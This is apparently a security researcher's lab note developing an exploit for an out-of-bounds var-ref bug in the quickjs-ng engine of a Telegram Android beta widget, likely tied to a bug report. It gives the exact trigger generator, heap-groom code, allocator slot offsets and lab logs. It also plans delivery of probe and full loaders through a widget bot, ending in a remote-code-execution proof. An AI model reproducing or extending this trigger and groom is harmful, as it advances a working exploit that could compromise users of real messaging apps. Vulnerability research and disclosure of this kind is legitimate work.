# #1865 small-ceiling groom — single fixed payload, safe S1 probe, and the universal-groom negative

Status: **host/lab only, no Sony/Pixel runs.** New payloads and loaders are in
the tree; the device plan is §6. This note does not modify the report.

Target: Telegram Android beta 13.2.0 (72799/72789), quickjs-ng `7a23d8e`
snapshot, arm64. Bug: #1865 `var_ref_count` truncation.

## 0. TL;DR

1. **New primitive (host-verified on the app-snapshot engine):** the captured
   parameter index `K` and the truncated capture count `vrc` can be chosen so
   that `K - vrc = 1568`. The OOB `JSVarRef` slot is then at
   `frame_commit_end + 0x30F0 = next_chunk_commit + 0x10F0`, i.e. at the next
   chunk's **user pointer + 0x100** (0xF8..0x108 with the observed Scudo
   slack), instead of `+0x7CF88`. **Any secondary ceiling ≥ 64 KiB works**;
   a ceiling no longer has to be > 516 KiB.
2. **Single fixed groom, no per-device A selection:** `PL=1.75 MiB` cached zero
   VMA (plug), `A=1 MiB` live zero ceiling, `T=frame class 0x100068`
   freed so `g()` reuses it. `A` skips the ~1.0 MiB Sony top gap; on the Pixel
   the `PL` VMA occupies the ~1.9 MiB top gap first, so `A/T` land in the next
   gap. The S1 probe scans `A` and the re-fetched `PL` and reports which one is
   directly above the frame.
3. **Built:** `PT_probe_lzss.html` — 5,344 B raw, **zlib9 3,530** (bot-fit,
   566 B margin); `PT_full_lzss16.html` — **zlib9 6,754** (local C2/DB-patch
   path). Direct widget HTMLs are included.
4. **Lab-validated:** qemu-aarch64 top-down reuse model gives
   `S1A off=4352 V=0x50000aaa00`, then the probe stops. Native app-snapshot
   engine reproduces `alloc=1,048,680`, `var_count=5`, `var_ref_count=3`,
   `idx=1571` and the exact slot formula.
5. **Rigorous negative:** a *guaranteed* universal groom is impossible with the
   measured gaps. §4 gives (a) the empty-interval proof for any fixed-size
   ceiling, (b) the multi-ceiling frontier obstruction, and (c) the reason a
   crash-free multi-A trial cannot exist: the slot value is always dereferenced
   as a `JSVarRef*`, and a SIGSEGV is not catchable from JS.

The single payload removes the *per-device branch*; it does not make the groom
provably correct on every process layout. The negative explains exactly what
would be needed to make it provable (address feedback, which the sandbox does
not expose).

## 1. The small-ceiling offset

`async_func_init()` allocates the generator frame:

```
alloc = 16 * (max(arg_count, argc) + var_count + stack_size) + 8 * var_ref_count
sf->var_refs = arg_buf + alloc - 8 * var_ref_count
```

`get_var_ref()` for the captured parameter `q` at index `K` does:

```
var_ref = sf->var_refs[K];          // OOB when K >= vrc
if (var_ref) JS_REF_COUNT(var_ref)++;
```

Scudo places the block at the top of the commit range, so for user pointer `U`
and commit end `E = U + alloc + 0x10`:

```
slot = U + alloc + 8 * (K - vrc) = E - 0x10 + 8 * (K - vrc)
```

The next adjacent secondary chunk has `CommitBase = E + 0x2000` and its user
pointer is `CommitBase + CommitSize - Size - 0x10`. For a page-multiple request
this is `CommitBase + 0xFF0`; the Android tombstone shows `+0xFF8` (the 8-byte
Scudo slack). With **K - vrc = 1568**:

```
slot = E + 0x30F0 = next_user + 0x100   (or +0xF8 with the observed slack)
```

A ceiling only needs `CommitSize > 0x10F8`, so even the smallest secondary
class (> 64 KiB) qualifies. This is the decisive change: the old groom needed a
≥ 516 KiB ceiling, so a ceiling plus the 1.012 MiB frame needed a gap of
≥ 1.55 MiB. The observed Sony internal gap is 1.49 MiB — just too small. A
128 KiB ceiling plus the frame needs only ~1.15 MiB, which fits that gap.

### 1.1 Exact generator used

```
K = 1571, N = 65534
params = "x,".repeat(1571) + "q" + ",x".repeat(63962)
eval("function* g("+params+"){ if(0) eval(''); var f=()=>q; yield f; }")
```

Direct `eval` marks every parameter and local captured. Capture order is
parameters first, so `q` gets `var_ref_idx = 1571`. The body has 5 captured
locals (measured), total captures `65534 + 5 = 65539`, hence
`var_ref_count = 65539 mod 65536 = 3` and `K - vrc = 1568`.

Measured on the app-snapshot engine (instrumented qjs, native):

```
[instr] async_func_init alloc=1048680 arg_count=65534 var_count=5 stack=2 var_ref_count=3
[instr] get_var_ref NEW ... idx=1571 slot=0x... 
```

The logged slot is exactly `arg_buf + 0x100068 + 8*(1571-3)`.

## 2. Payload and groom

```
PL = new ArrayBuffer(0x1C0000); fill(0); PL = null;   // 1.75 MiB, cached zero VMA
A  = new ArrayBuffer(0x100000); fill(0); keep;        // 1 MiB, live zero ceiling
T  = new ArrayBuffer(0x100068); fill(0); T = null;    // exact frame class -> MRU
it = g();                                             // frame reuses T's block
f  = it.next().value;                                 // OOB at ceiling user + ~0x100
```

Why these sizes:

* `PL = 1.75 MiB` fits the ~1.9 MiB Pixel top gap and (when freed) leaves a
  zero VMA that plugs most of it; `A = 1 MiB` skips the ~1.0 MiB Sony top gap
  by a small margin (map 0x103000). On the Pixel, `PL` leaves only ~0.15 MiB
  of the top gap free, so `A` and `T` cannot stay there; they use the next gap.
  If `T` is placed directly below `PL` instead (the top gap left ≥ `T`), the
  slot is in `PL` — also a zero ceiling, and the probe scans it.
* On the Sony-like layout the top gap cannot host `A + T`; `A` goes to the
  first gap that fits it (≥1.06 MiB), and `T` is placed directly below it when
  that gap has ≥1.06 MiB left after `A` (gap ≥2.12 MiB). The host Scudo replay
  reproduces this `PL/A/T` stack for the 1.0 MiB top-gap runs; the 1.9 MiB runs
  depend on where the freed `PL` VMA lands in the harness, so the Pixel
  ordering is not proven there (the device probe is).
* All ceilings are zeroed; the S1 scan takes the first nonzero 8-byte word in
  the first `0x4000` bytes. That window covers the device geometry (`+0xF8`),
  the qemu model (`+0x1100`), and ±2K of frame-size/vrc drift.

The probe stops after S1 (`S1 DONE (probe stops)`); it does not allocate
`buf2`, does not write a fake var-ref, and does not touch `rt+16`.

Marker meanings:

| marker | meaning |
|---|---|
| `S0` | payload started |
| `S1A off=… V=0x…` | slot found in the live `A` ceiling at user offset `off`; `V` is the leaked `JSVarRef *` |
| `S1P off=… V=0x…` | slot found in the re-fetched `PL` block (cache retrieve) |
| `S1 NOLEAK` | first 0x4000 bytes of both ceilings are zero: slot hit some other zero memory (safe; retry) |
| `S1 DONE (probe stops)` | probe completed without S2 |
| `S2 pv=… F=… off=…` | full payload reached the fake-BigInt leak |
| `S2 NOFRAME` | `buf2` did not reuse the frame (safe abort) |
| `S3b PLT/FALLBACK/NOFREE`, `S4`, `S5`, `S6` | unchanged v2 chain |

## 3. Files, sizes, hashes

| file | role | raw | zlib9 | md5 |
|---|---|---:|---:|---|
| `poc/uw_pt_probe.js` | probe payload (lab/standalone) | 2,607 | — | `3365b797fdf0132760133300e4d97deb` |
| `poc/uw_pt_full.js` | full payload (S1→S6) | 10,142 | — | `7a80c1cec9d838b43ce5160d854974a3` |
| `widget_poc_1865_pt_probe.html` | direct widget (DB patch / large HTML) | 2,683 | — | `fe420869d4ecc1f9ecdb1c959eb51bb0` |
| `widget_poc_1865_pt_full.html` | direct widget (DB patch) | 10,218 | — | `511920699f6d5a86c23b06cd2bb20230` |
| `loaders/size_variants/out/PT_probe_lzss.html` | **bot loader** (PIN 19111998) | 5,344 | **3,530** | `059128764f14e7f376f33eefb5f4ac28` |
| `loaders/size_variants/out/PT_full_lzss16.html` | local C2/DB loader (16 KiB buffer) | 9,469 | **6,754** | `f24720074a66d9b724d5e3a51846fe34` |

Build: `python3 loaders/size_variants/build_pt_loaders.py`.
Both loaders pass `node validate.js` (`ROUNDTRIP_OK`, wrong PIN blocked).

## 4. Rigorous negative: no guaranteed universal groom

### 4.1 Empty interval for a fixed ceiling

Let `G_s` and `G_p` be the Sony/Pixel top-gap sizes, `C` the map size of a
fixed zero ceiling, `T` the frame map size (≈1.012 MiB). For a ceiling to be
directly above the frame, the ceiling and the frame must be consecutive in the
same gap, which requires that gap to be at least `C + T`.

The measured values (from the sweep and the tombstones) are
`G_s ≈ 1.0 MiB`, `G_p ≈ 1.9 MiB`, and the next Sony gap is ≈2.1–2.26 MiB.

* If `C ≤ G_s`, `C` fits the Sony top gap. But `G_s < C + T` for every
  secondary `C` (the minimum `C` is ~0.07 MiB, so `C + T > 1.08 MiB > 1.0`),
  so the frame cannot follow `C` in that gap. `T` is placed elsewhere, and the
  slot lands above `T`, not above `C`.
* Therefore `C > G_s` is required. On the Pixel, either `C` fits the top gap
  (`C ≤ G_p`) and the frame follows only if `G_p - C ≥ T`, i.e.
  `C ≤ G_p - T ≈ 0.89 MiB` — contradicting `C > 1.0 MiB`; or `C > G_p`, and
  then the pair needs the next gap `G_next ≥ C + T > 1.9 + 1.012 = 2.91 MiB`.
  The available Sony next gap is ~2.1–2.26 MiB, and the tombstone's internal
  gap is 1.49 MiB. No `C` satisfies both.

This is the same obstruction as the two fixed A/T variants, stated as an
interval: the Sony constraint and the Pixel constraint are disjoint.

The shipped payload uses **two** ceilings (`PL=1.75 MiB` and `A=1 MiB`), so
this one-ceiling interval proof does not apply to it directly: on the Pixel,
`PL` can occupy the top gap and push `A/T` into the next gap. That is the
multi-ceiling case of §4.2; it is a heuristic, not a guarantee. It works only
if the next gap is at least `A + T ≈ 2.03 MiB` and the frontier ceiling is the
one directly above `T`. The probe reports which ceiling got the slot precisely
so a failure can be attributed to the frontier.

### 4.2 Multi-ceiling/tiling frontier

With a fixed sequence of k ceilings, each allocation takes the top of the
highest gap that fits it. A gap that has received a ceiling is filled until its
leftover is smaller than the ceiling; it can then no longer host `T` (which is
larger than the small ceilings). `T` therefore lands in the first *frontier*
gap where the ceiling supply stopped, or in an untouched gap below it. Whether
the frontier leftover is ≥ `T` is a function of the unknown gap-size vector.
A fixed k cannot be correct for both the Sony and Pixel vectors, and the
secondary cache holds at most 32 entries, so no fixed amount of cached tiling
covers an arbitrary number of gaps. A wrong frontier means `T`'s upper
neighbour is a live foreign chunk → the same SIGSEGV as the old groom.

### 4.3 Why a crash-free multi-A trial is impossible

In `get_var_ref()` the slot is read and, if nonzero, immediately dereferenced
as a `JSVarRef *` (`JS_REF_COUNT`). There is no engine path that reads the slot
without the dereference, and a SIGSEGV cannot be caught from JS. A trial with a
wrong A is therefore not a probe: it either finds a zero slot (safe) or kills
the sandbox. The previous leak3 payload demonstrated exactly this: it crashed
at the JSVarRef dereference (`fault 0x77982f118a`) before it could print `off`.

What *is* possible in one widget is multiple **placements of zero ceilings**
(the probe scans `A` and the re-fetched `PL`), because the slot only has to be
inside any one of them. The probe still has the residual crash mode: if the
frame's upper neighbour is neither `A`, `PL`, nor another zero VMA, the first
`it.next()` dereferences foreign memory.

## 5. Lab evidence (host only)

### 5.1 qemu-aarch64 top-down reuse model

Harness: `version_variants/allocator/guardrt_var.c`, `VARDIR=top`, `VARMODE=1`
(exact-size reuse), `VARTHRESH=131072`, 8 MiB, 4 KiB pages. The model stacks
`PL`, `A`, `T` downward and reuses `T` for the frame. Log:
`lab/qjs_postsnapshot/notes_pt/lab_probe_qemu.log`.

```
[js] UI S0 | S1A off=4352 V=0x50000aaa00
[js] UI S0 | S1A off=4352 V=0x50000aaa00 | S1 DONE (probe stops)
[guard] ok (mem 3784327)
```

`off=4352 (0x1100)` is the model's inter-chunk geometry; the device geometry
should be `0xF8..0x108`. The scan window covers both.

### 5.2 Native app-snapshot engine

With the exact generator (plus the parser work-around needed by the host
build), the payload reaches `S1 NOLEAK` without a Scudo ceiling (glibc does not
form the A/T pair); the frame allocation and `idx` are exactly as predicted.
This is the safe path, not a crash.

### 5.3 Host Scudo replay

`harness/groom_pt.cpp` (real AOSP android-13 secondary allocator, synthetic
top gap) reproduces the `PL/A/T` adjacency for the 1.0 MiB top-gap runs; the
1.9 MiB runs depend on where the freed `PL` VMA landed, so they are not a
Pixel proof. In all adjacent runs the slot lands at `A.user - 8` without the
+0x100 shift and at `A.user + 0x100` with it. This is the evidence that the +0x100 offset is
necessary: the old K-vrc=1536 lands in the 0x30-byte LargeBlock header on the
host and would dereference a header pointer.

## 6. Device test plan

Do not run both devices from this session; the commands are for the device
runner.

### 6.1 Sony XQ-BT52 (A13)

1. Upload `loaders/size_variants/out/PT_probe_lzss.html` to the beta widget bot
   (zlib9 3,530 < 4,096). PIN `19111998`.
2. `am force-stop` the beta app, start it, open the widget chat, render the
   widget at the true-bottom geometry; enter the PIN.
3. Read `#w` (the loader now has a marker div above the canvas). Record the
   whole string and the widget message id/geometry.
4. Expected: `S0 | S1A off=<~248..4352> V=0x… | S1 DONE` or `S1P …`; no
   tombstone. If `S1 NOLEAK`: safe miss; repeat cold 3× and record.
5. If a tombstone appears, record `pc`, `fault addr`, and the map window; the
   expected placement-miss signature is the `0x1714b3c` JSVarRef dereference
   family (the old `0x890` is the bytecode-slot case).
6. Only after a probe `S1A/S1P`: install `widget_poc_1865_pt_full.html` (or the
   `PT_full_lzss16.html` loader) via the local DB patch, not the bot (zlib9
   6,754 > 4,096). Expect `S0 | S1… | S2 … | S3b PLT … | S4 | S5 | S6` and a
   fresh `rce_proof`; check all five paths.

### 6.2 Pixel 9 (A17)

Same probe/loader through the bot. The model predicts the Pixel top gap
(~1.9 MiB) is plugged by `PL`, and `T` lands below `PL` (S1P) or below `A`
(S1A) depending on the gap order. Record the exact `off`; the 0..0x4000 scan
window covers both the device and the qemu geometry. The full loader must go
through the local C2/DB path (or the existing `PIXEL9_c2` delivery), not the
bot limit.

### 6.3 Acceptance / interpretation

* **Probe:** ≥9/10 cold runs with no tombstone; at least one `S1A`/`S1P`, or a
  clean `S1 NOLEAK` with the recorded offset. A single crash is a placement
  miss, not a payload syntax failure (the loaders are roundtrip-validated).
* **Full:** `S1A/S1P → S6` in ≥9/10 cold runs on both devices. `S2 NOFRAME`,
  `S3b NOFREE`, `S1 NOLEAK` are clean aborts.
* **If both devices report `S1P`:** the `A` ceiling can be dropped in a later
  build (saves 1.94 MiB). If Sony reports `S1 NOLEAK` repeatedly while Pixel
  reports `S1A`, the Sony `A` is not adjacent; the next probe should add one
  more small ceiling in the internal gap (the 1.49 MiB gap is the observed
  culprit).
* **If a crash occurs at the JSVarRef dereference:** record the fault value.
  A fault with a small non-canonical value (`0x890`-style) means the slot hit
  the generator bytecode; a fault at a mapped-looking pointer means the slot
  hit a cached but nonzero VMA. Both are placement misses, not a broken K/vrc.

## 7. Remaining risk and what would make it provable

* The single fixed payload is not a proof; it is the strongest fixed groom
  available without address feedback. The residual crash is exactly the
  foreign-upper-neighbour case of §4.2.
* A real Pixel `/proc/self/maps` (or a benign tombstone) would let us replace
  the approximate `G_p` with the actual gap vector and choose `PL/A/T` (or a
  small-ceiling count) that is correct for that vector. A per-device variant is
  then derivable offline, but the *runtime* still cannot select it.
* The only way to a provable universal payload is a safe address/placement
  oracle in the widget sandbox, or a different bug primitive that does not
  dereference the OOB slot. #1865's slot read is always a dereference, so it
  cannot be that primitive.

## 8. Files added

```
lab/qjs_postsnapshot/poc/uw_pt_probe.js
lab/qjs_postsnapshot/poc/uw_pt_full.js
lab/qjs_postsnapshot/widget_poc_1865_pt_probe.html
lab/qjs_postsnapshot/widget_poc_1865_pt_full.html
lab/qjs_postsnapshot/loaders/size_variants/build_pt_loaders.py
lab/qjs_postsnapshot/loaders/size_variants/out/PT_probe_lzss.html
lab/qjs_postsnapshot/loaders/size_variants/out/PT_full_lzss16.html
lab/qjs_postsnapshot/harness/groom_pt.cpp
lab/qjs_postsnapshot/notes_pt/lab_probe_qemu.log
```

Reproduce the probe lab run:

```sh
cd lab/qjs_postsnapshot
aarch64-linux-gnu-gcc -O2 -I/tmp/opencode/qjs018 -DPAGE_SIZE=4096 \
  version_variants/allocator/guardrt_var.c \
  /tmp/opencode/qjs_postsnapshot/pg/libqjs-aarch64.a -lm -lpthread \
  -Wl,-z,now -o /tmp/guardrt_var
VARPAGE=4096 VARDIR=top VARMODE=1 VARGAP=0 VARTHRESH=131072 \
  qemu-aarch64 -L /usr/aarch64-linux-gnu /tmp/guardrt_var 8 \
  /tmp/opencode/pt_probe_lab_a64.js
```

(`pt_probe_lab_a64.js` = `h0` parser work-around + DOM/rAF stubs + the probe
payload; the device engine does not need the work-around.)
